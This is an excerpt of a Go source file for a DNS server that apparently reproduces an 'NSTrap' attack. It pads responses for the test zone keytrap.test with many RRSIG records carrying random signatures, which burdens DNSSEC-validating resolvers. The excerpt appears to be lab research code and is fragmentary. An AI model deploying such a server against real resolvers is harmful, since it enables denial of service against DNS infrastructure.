 ...
 * @File    :   NSTrap_A&AAAA.go
 * @Contact :	tochus@163.com
 * @License :   (C)Copyright 2024
 * @Description: A DNS server that cause "NSTrap" with A&AAAA record.
 *
 ...
 * 15/10/24 19:49      4stra       0.3.0       8NS A&AAAA in AR with 10 Sig
 */
		...
		for j := 0; j < randomSigNumC; j++ {
			additional = append(
				...
				layers.DNSResourceRecord{
					...
					Class:      layers.DNSClassIN,
					TTL:        uint32(globalTTLC),
					DataLength: baseARRSIG.Len() + uint16(rrsigSignatureByteLenC),
					Data:       append(baseARRSIG.Serialize(), genRandomByte(rrsigSignatureByteLenC)...),
				},
				layers.DNSResourceRecord{
					Name:       []byte(fmt.Sprintf("ns%d.keytrap.test", i)),
					Type:       layers.DNSTypeRRSIG,
					Class:      layers.DNSClassIN,
					TTL:        uint32(globalTTLC),
					DataLength: baseAAAARRSIG.Len() + uint16(rrsigSignatureByteLenC),
					Data:       append(baseAAAARRSIG.Serialize(), genRandomByte(rrsigSignatureByteLenC)...),
				},
			)
		}
	}
...
var baseAAAARRSIG = &RRSIG{
	TypeCovered: uint16(layers.DNSTypeAAAA),
	Algorithm:   14,
	Labels:      3,
	OriginalTTL: globalTTL,
	Expiration:  expiration,
...
var (
	...
	expirationC = "20241114103005"
	inceptionC  = "20241015103005"
	...
	signaturesC = map[string]string{
		"www.keytrap.test.": "VX99GOcXr57KmoTzOQFY5g274i2p02Ik9CJG4LbPRTL4qJXp6bg4ZeKPwQXWOok9whbUhVVE6qj44aC32BCLoZRtNB8L0u5aQn3ZxryoZXWIm9/zj/NS1pkVsszZUlqJ",
		"keytrap.test.":     "nIoDm9oF2FgGTPodiSfJCZTPX9wctXvZ7nI6bGguTtzL5NY7/c6/71plHPUolKS/gWxRo62dw3b9lb+l5Db1EHZRa/uMxABZAprVRRLXXZiAt5m5AhJAh7+NnZOu/NVu",
		"ZSK":               "US1Zc4jRlgbn69zF7Cwn/VjzK24XyEB8/2mWs7X2OEtt8xXNxPYng1fnTnSYXGtlptqzdMltgoyVw6rUEooFJ/sLCof9Tx4TeXa7bVuNxcT6KYvzPHQHhbGYlnrqFU+6",
		"KSK":               "d+5SAK4hNDUQhondXkM/l40ERruOqVBWmBJFjVISz2zAZxL18YKs0MYs8Tr5tQzGvimq/SVjK/ZhmqTMR/ueBNerHxYckjLbjBeO8U25ZEwg2P7TdhisOKZ5hBO+JhMv",
	}
